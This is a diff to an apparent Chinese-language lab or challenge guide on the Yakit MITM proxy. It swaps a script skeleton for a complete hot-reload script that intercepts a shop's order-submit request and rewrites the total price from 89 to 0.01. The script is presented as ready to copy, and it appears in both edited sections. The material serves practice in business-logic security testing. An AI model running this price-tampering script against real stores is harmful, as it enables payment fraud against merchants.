@@ -15,19 +15,22 @@ difficulty: practitioner
 
 **① MITM 代理观察**：系统（或浏览器插件）代理指向 Yakit MITM 监听地址，装一次证书（MITM 页有引导）。浏览器里的每一次登录、下单都会出现在 MITM 历史里——**先让真实业务流量跑起来，你在旁边看**，这是所有测试的标准开局。
 
-**② 热加载自动改包（本题必经之路）**：MITM 页进入「热加载」/插件面板，新建 Yak 脚本。脚本对**每一个经过代理的请求**做检查改写，保存即生效——**不用断开代理、不用重启**，下一个经过的请求就带着你的改写逻辑。本题就用它把浏览器结算订单的金额自动换成 0.01。一段可以直接抄的脚本骨架：
+**② 热加载自动改包（本题必经之路）**：MITM 页进入「热加载」/插件面板，新建 Yak 脚本。脚本对**每一个经过代理的请求**做检查改写，保存即生效——**不用断开代理、不用重启**，下一个经过的请求就带着你的改写逻辑。本题就用它把浏览器结算订单的金额自动换成 0.01。一段照抄即可用的完整脚本：
 
 ```javascript
-// MITM 热加载脚本：把商城结算订单的金额改写为 0.01
-// 骨架按 Yakit MITM 热加载的劫持写法给出，函数名/取值细节以你所用
-// Yakit 版本的「MITM 交互页 → 热加载」示例模板为准，替换后即可用
-// 注意：替换串必须与真实 body 的原文一字不差——浏览器提交的是紧凑
-// JSON（冒号后没有空格），金额也没有小数位（见第 2 步抓到的 body）
-hijackSave = func (isHttps, url, req, rsp, body) {
-    if (isPost() && fisContains(url, `/mall/order/submit`)) {
-        body = replace(body, `"TotalPrice":"89"`, `"TotalPrice":"0.01"`)
+// MITM 热加载脚本：自动把「提交订单」的金额改写为 0.01。
+// beforeRequest 是 Yakit MITM 热加载的请求劫持钩子：req 是经过代理的
+// 原始请求报文，返回值就是真正发给服务端的请求——保存即生效
+beforeRequest = func(req) {
+    // 只处理「提交订单」这一条请求，其余流量原样放行
+    if str.Contains(string(poc.GetHTTPPacketFirstLine(req)), `POST /mall/order/submit`) {
+        body = string(poc.GetHTTPPacketBody(req))
+        // 替换串必须与真实 body 原文一字不差（紧凑 JSON、金额无小数位）
+        body = str.ReplaceAll(body, `"TotalPrice":"89"`, `"TotalPrice":"0.01"`)
+        // 写回报文，Content-Length 由 poc 帮你自动重算
+        req = poc.ReplaceHTTPPacketBody(req, body)
     }
-    return body
+    return req
 }
 ```
 
@@ -66,14 +69,22 @@ hijackSave = func (isHttps, url, req, rsp, body) {
 
 **第 3 步：热加载——挂上自动改价脚本**
 
-MITM 页 →「热加载」，新建 Yak 脚本，贴入骨架（把实例地址与替换规则对准第 2 步抓到的 body 原文）：
+MITM 页 →「热加载」，新建 Yak 脚本，贴入脚本（替换串对准第 2 步抓到的 body 原文；一次买多件就以抓到的实际金额为准，比如两件是 `"TotalPrice":"178"`）：
 
 ```javascript
-hijackSave = func (isHttps, url, req, rsp, body) {
-    if (isPost() && fisContains(url, `/mall/order/submit`)) {
-        body = replace(body, `"TotalPrice":"89"`, `"TotalPrice":"0.01"`)
+// MITM 热加载脚本：自动把「提交订单」的金额改写为 0.01。
+// beforeRequest 是 Yakit MITM 热加载的请求劫持钩子：req 是经过代理的
+// 原始请求报文，返回值就是真正发给服务端的请求——保存即生效
+beforeRequest = func(req) {
+    // 只处理「提交订单」这一条请求，其余流量原样放行
+    if str.Contains(string(poc.GetHTTPPacketFirstLine(req)), `POST /mall/order/submit`) {
+        body = string(poc.GetHTTPPacketBody(req))
+        // 替换串必须与真实 body 原文一字不差（紧凑 JSON、金额无小数位）
+        body = str.ReplaceAll(body, `"TotalPrice":"89"`, `"TotalPrice":"0.01"`)
+        // 写回报文，Content-Length 由 poc 帮你自动重算
+        req = poc.ReplaceHTTPPacketBody(req, body)
     }
-    return body
+    return req
 }
 ```
 
